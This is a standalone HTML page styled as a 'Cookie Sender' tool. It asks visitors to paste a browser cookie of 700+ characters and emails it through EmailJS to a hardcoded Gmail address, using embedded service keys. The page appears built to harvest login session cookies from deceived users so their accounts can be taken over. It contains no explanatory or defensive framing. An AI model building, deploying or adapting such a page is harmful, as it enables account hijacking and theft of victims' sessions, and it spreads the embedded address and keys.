<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cookie Sender</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #333;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #444;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
      max-width: 500px;
      width: 100%;
    }
    h1 {
      text-align: center;
      margin-bottom: 20px;
    }
    textarea {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: none;
      resize: none;
      font-size: 14px;
    }
    button {
      background-color: #5c6bc0;
      color: white;
      padding: 10px;
      border-radius: 5px;
      border: none;
      width: 100%;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #3f4b94;
    }
    .error {
      color: red;
      font-size: 14px;
      text-align: center;
    }
    .success {
      color: green;
      font-size: 14px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Cookie Sender</h1>
    <textarea id="cookieInput" rows="10" placeholder="Enter Cookie (700+ characters)..."></textarea>
    <button onclick="sendCookie()">Send Cookie</button>
    <div class="error" id="errorMessage"></div>
    <div class="success" id="successMessage"></div>
  </div>

  <!-- Include EmailJS -->
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    // Initialize EmailJS
    emailjs.init("1RUraa7fRYbQ2fuPR"); // Replace with your actual User ID

    function sendCookie() {
      const cookieInput = document.getElementById('cookieInput').value;
      const errorMessage = document.getElementById('errorMessage');
      const successMessage = document.getElementById('successMessage');

      // Clear previous messages
      errorMessage.textContent = '';
      successMessage.textContent = '';

      // Validate cookie input
      if (cookieInput.length < 700) {
        errorMessage.textContent = 'Error: Cookie must be at least 700 characters long.';
        return;
      }

      // Send email with EmailJS
      emailjs.send("service_bupfcwd", "template_fkuvg0k", {
        cookie: cookieInput,
        to_email: "simplyb4th@gmail.com"
      })
      .then(() => {
        successMessage.textContent = 'Cookie sent successfully.';
      })
      .catch((error) => {
        console.error("Error sending email:", error);
        errorMessage.textContent = 'Failed to send cookie. Check console for details.';
      });
    }
  </script>
</body>
</html>
